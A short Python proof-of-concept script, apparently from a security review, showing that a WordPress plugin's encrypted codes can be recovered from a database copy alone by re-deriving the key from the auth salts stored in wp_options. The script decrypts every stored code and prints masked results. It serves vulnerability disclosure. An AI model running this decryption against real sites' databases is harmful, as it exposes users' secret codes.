"""Proof: with no ASSET_GME_KEY, a DB copy alone yields the key (salts in wp_options) and decrypts every code."""
import base64, hashlib, sqlite3, sys
try:
    import nacl.secret
except ImportError:
    sys.exit("PyNaCl missing")
c = sqlite3.connect(sys.argv[1])
o = dict(c.execute("select option_name, option_value from wp_options where option_name in ('auth_key','auth_salt')"))
salt = o["auth_key"] + o["auth_salt"]  # wp_salt('auth') = AUTH_KEY . AUTH_SALT when constants are unset
key = hashlib.blake2b((salt + "|asset-gme-v1").encode(), digest_size=32).digest()  # sodium_crypto_generichash, no key
ok = 0
for cid, enc in c.execute("select congres_id, code_enc from wp_asset_gme_codes"):
    raw = base64.b64decode(enc)
    try:
        pt = nacl.secret.SecretBox(key).decrypt(raw[24:], raw[:24]); ok += 1
        print(cid, pt.decode()[:9] + "****")
    except Exception as e:
        print(cid, "FAIL", type(e).__name__)
print("decrypted", ok)
